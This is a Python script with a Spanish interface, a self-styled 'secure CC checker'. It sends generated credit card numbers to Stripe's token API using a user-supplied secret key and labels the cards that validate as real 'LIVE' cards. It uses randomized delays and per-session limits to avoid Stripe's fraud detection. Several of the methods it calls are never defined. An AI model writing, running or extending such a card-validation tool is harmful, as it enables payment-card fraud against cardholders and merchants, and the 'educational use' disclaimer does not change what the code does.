#!/usr/bin/env python3
import requests
import json
import random
import time
import os
import sqlite3
from datetime import datetime, timedelta
from colorama import Fore, Style, init

init(autoreset=True)

class SecureCCChecker:
    def __init__(self):
        self.sk = ""
        self.sk_type = ""  # 'test' o 'live'
        self.generated_cards = []
        self.valid_cards = []
        self.setup_database()
        
    def set_stripe_key(self):
        print(f"\n{Fore.CYAN}=== CONFIGURAR STRIPE SECRET KEY ===")
        sk = input("Ingresa tu Stripe Secret Key: ").strip()
        
        if sk.startswith('sk_test_'):
            self.sk = sk
            self.sk_type = 'test'
            print(f"{Fore.GREEN}✓ SK de TEST configurado correctamente")
            print(f"{Fore.YELLOW}⚠️  Solo detectará tarjetas de prueba")
            return True
            
        elif sk.startswith('sk_live_'):
            self.sk = sk
            self.sk_type = 'live'
            print(f"{Fore.GREEN}✓ SK de LIVE configurado correctamente")
            print(f"{Fore.RED}🚨 MODO LIVE ACTIVADO - EXTREMA PRECAUCIÓN")
            self.show_live_warning()
            return True
        else:
            print(f"{Fore.RED}✗ Formato de SK inválido")
            return False
    
    def show_live_warning(self):
        """Muestra advertencias para SK_LIVE"""
        print(f"\n{Fore.RED}=== ADVERTENCIA MODO LIVE ===")
        print(f"{Fore.YELLOW}• Estás usando una clave REAL de Stripe")
        print(f"{Fore.YELLOW}• Stripe puede detectar actividad sospechosa")
        print(f"{Fore.YELLOW}• Tu cuenta podría ser suspendida")
        print(f"{Fore.YELLOW}• Usa con responsabilidad y pocas validaciones")
        
        confirm = input(f"\n{Fore.RED}¿Continuar? (s/n): ").lower()
        if confirm != 's':
            self.sk = ""
            self.sk_type = ""
            print(f"{Fore.GREEN}✓ Modo LIVE cancelado")
            return False
        return True
    
    def safe_validate_cc(self, cc_data):
        """Validación segura con protecciones mejoradas"""
        if not self.sk:
            return False, False, "No SK configured"
        
        # PROTECCIÓN 1: Límite máximo de validaciones por sesión
        if len(self.valid_cards) > 50 and self.sk_type == 'live':
            return False, False, "Límite de seguridad alcanzado"
        
        # PROTECCIÓN 2: Delay más largo para SK_LIVE
        base_delay = 1.0 if self.sk_type == 'live' else 0.5
        
        try:
            headers = {
                'Authorization': f'Bearer {self.sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            data = {
                'card[number]': cc_data['number'],
                'card[exp_month]': cc_data['exp_month'],
                'card[exp_year]': cc_data['exp_year'],
                'card[cvc]': cc_data['cvc']
            }
            
            # PROTECCIÓN 3: Timeout más corto para LIVE
            timeout = 10 if self.sk_type == 'live' else 15
            
            response = requests.post(
                'https://api.stripe.com/v1/tokens',
                headers=headers,
                data=data,
                timeout=timeout
            )
            
            is_valid = False
            is_live = False
            message = ""
            
            if response.status_code == 200:
                is_valid = True
                response_data = response.json()
                
                # Para SK_LIVE, casi todas las válidas son LIVE
                if self.sk_type == 'live' and is_valid:
                    is_live = True
                    message = "LIVE - Tarjeta real verificada"
                else:
                    # Para SK_TEST, análisis de patrones
                    if 'card' in response_data:
                        card_info = response_data['card']
                        test_indicators = [
                            card_info.get('brand') == 'Unknown',
                            'test' in str(card_info).lower(),
                        ]
                        
                        if not any(test_indicators):
                            is_live = True
                            message = "LIVE - Tarjeta real detectada"
                        else:
                            message = "Valid - Tarjeta de prueba"
                    
            elif response.status_code == 402:
                error_data = response.json().get('error', {})
                message = f"Invalid - {error_data.get('message', 'Error de pago')}"
            else:
                message = f"Invalid - HTTP {response.status_code}"
                
            # PROTECCIÓN 4: Delay adaptativo
            time.sleep(base_delay + random.uniform(0.2, 0.5))
                
            return is_valid, is_live, message
                
        except requests.exceptions.Timeout:
            return False, False, "Timeout - Servidor no responde"
        except requests.exceptions.ConnectionError:
            return False, False, "Connection Error - Sin conexión"
        except Exception as e:
            return False, False, f"Error: {str(e)}"
    
    def validate_with_limits(self):
        """Validación con límites estrictos para LIVE"""
        if not self.sk:
            print(f"{Fore.RED}✗ Primero configura el Stripe Secret Key")
            return
        
        if not self.generated_cards:
            print(f"{Fore.RED}✗ No hay tarjetas generadas para validar")
            return
        
        # LÍMITES DIFERENTES SEGÚN TIPO DE SK
        if self.sk_type == 'live':
            max_cards = min(20, len(self.generated_cards))
            print(f"{Fore.RED}🚨 MODO LIVE - Límite: {max_cards} tarjetas por seguridad")
        else:
            max_cards = len(self.generated_cards)
        
        cards_to_validate = self.generated_cards[:max_cards]
        
        print(f"\n{Fore.CYAN}=== VALIDANDO {len(cards_to_validate)} TARJETAS ===")
        print(f"{Fore.YELLOW}Modo: {self.sk_type.upper()} - Usando protecciones de seguridad...")
        
        valid_count = 0
        live_count = 0
        
        for i, card in enumerate(cards_to_validate, 1):
            bin_status = f"{Fore.GREEN}✓" if card['bin_valid'] else f"{Fore.RED}✗"
            print(f"{Fore.WHITE}[{i}/{len(cards_to_validate)}] {bin_status} {card['number']}... ", end="")
            
            is_valid, is_live, message = self.safe_validate_cc(card)
            card['stripe_valid'] = is_valid
            card['live'] = is_live
            card['validation_message'] = message
            
            # SISTEMA DE COLORES MEJORADO
            if is_live:
                print(f"{Fore.GREEN}LIVE ✓")
                live_count += 1
                valid_count += 1
                self.valid_cards.append(card)
            elif is_valid:
                print(f"{Fore.CYAN}VÁLIDA ✓")
                valid_count += 1
                self.valid_cards.append(card)
            else:
                print(f"{Fore.RED}INVÁLIDA ✗")
        
        # MOSTRAR RESULTADOS CON ADVERTENCIAS
        print(f"\n{Fore.GREEN}=== VALIDACIÓN COMPLETADA ===")
        print(f"{Fore.WHITE}Total procesadas: {len(cards_to_validate)}")
        print(f"{Fore.CYAN}Válidas: {valid_count}")
        print(f"{Fore.GREEN}LIVE: {live_count}")
        
        if self.sk_type == 'live':
            print(f"\n{Fore.RED}⚠️  ADVERTENCIA MODO LIVE:")
            print(f"{Fore.YELLOW}• Estas tarjetas son REALES y funcionales")
            print(f"{Fore.YELLOW}• No las uses para actividades ilegales")
            print(f"{Fore.YELLOW}• Stripe puede haber registrado esta actividad")
    
    def show_security_menu(self):
        """Menú con indicadores de seguridad"""
        sk_status = f"{Fore.GREEN}LIVE" if self.sk_type == 'live' else f"{Fore.CYAN}TEST"
        security_level = f"{Fore.RED}ALTA" if self.sk_type == 'live' else f"{Fore.GREEN}MEDIA"
        
        print(f"\n{Fore.MAGENTA}=== CHECKER CC - MODO {sk_status} ===")
        print(f"{Fore.CYAN}SK: {'✓' if self.sk else '✗'} | Seguridad: {security_level}")
        print(f"{Fore.CYAN}Tarjetas en memoria: {len(self.generated_cards)}")
        print(f"{Fore.CYAN}Tarjetas validadas: {len(self.valid_cards)}")
        
        if self.sk_type == 'live':
            remaining = max(0, 20 - len(self.valid_cards))
            print(f"{Fore.RED}Límite restante: {remaining}/20")
        
        print(f"{Fore.YELLOW}1. Configurar Stripe SK (TEST/LIVE)")
        print(f"{Fore.YELLOW}2. Generar tarjetas (1-1000)")
        print(f"{Fore.YELLOW}3. Validar con protecciones")
        print(f"{Fore.YELLOW}4. Mostrar resultados")
        print(f"{Fore.YELLOW}5. Exportar resultados")
        print(f"{Fore.YELLOW}6. Limpiar datos por seguridad")
        print(f"{Fore.YELLOW}0. Salir")
        
        choice = input(f"\n{Fore.GREEN}Selecciona una opción: ")
        return choice
    
    def clear_data_for_security(self):
        """Limpia datos sensibles por seguridad"""
        print(f"\n{Fore.RED}=== LIMPIEZA DE SEGURIDAD ===")
        confirm = input("¿Eliminar TODOS los datos? (s/n): ").lower()
        if confirm == 's':
            self.generated_cards = []
            self.valid_cards = []
            self.sk = ""
            self.sk_type = ""
            print(f"{Fore.GREEN}✓ Todos los datos eliminados")
        else:
            print(f"{Fore.YELLOW}✓ Limpieza cancelada")

    def run(self):
        print(f"{Fore.CYAN}Checker CC Seguro iniciado")
        print(f"{Fore.RED}⚠️  SOLO USO EDUCATIVO - RESPONSABILIDAD DEL USUARIO")
        
        while True:
            choice = self.show_security_menu()
            
            if choice == '1':
                self.set_stripe_key()
            elif choice == '2':
                self.generate_multiple_cc()
            elif choice == '3':
                self.validate_with_limits()
            elif choice == '4':
                self.show_generated_cards()
            elif choice == '5':
                self.export_cards()
            elif choice == '6':
                self.clear_data_for_security()
            elif choice == '0':
                print(f"{Fore.GREEN}¡Sesión terminada de forma segura!")
                break
            else:
                print(f"{Fore.RED}Opción inválida")
            
            input(f"\n{Fore.YELLOW}Presiona Enter para continuar...")

if __name__ == "__main__":
    checker = SecureCCChecker()
    checker.run()